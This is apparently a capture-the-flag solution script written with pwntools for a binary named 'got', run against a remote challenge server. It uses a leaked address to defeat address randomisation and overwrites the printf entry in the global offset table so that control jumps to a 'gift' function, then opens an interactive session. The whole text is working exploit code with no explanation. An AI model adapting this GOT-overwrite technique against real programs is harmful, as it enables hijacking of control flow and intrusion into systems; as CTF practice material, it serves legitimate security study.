from pwn import *
context.binary = './got'
context.log_level = 'debug'

p = './got'
e = ELF(p)

#r = gdb.debug(p, 'b vuln\n c\n')
r = remote('chal.firebird.sh',35024)
r.recvuntil(b'0x')
vuln_leak = int(r.recv(12),16)
r.recvuntil(b'your name?\n')

r.sendline(flat({
        24: vuln_leak - e.sym['vuln'] + e.got['printf']
}))

r.recvuntil(b'?\n')

r.send(vuln_leak - e.sym['vuln'] + e.sym['gift'])

r.interactive()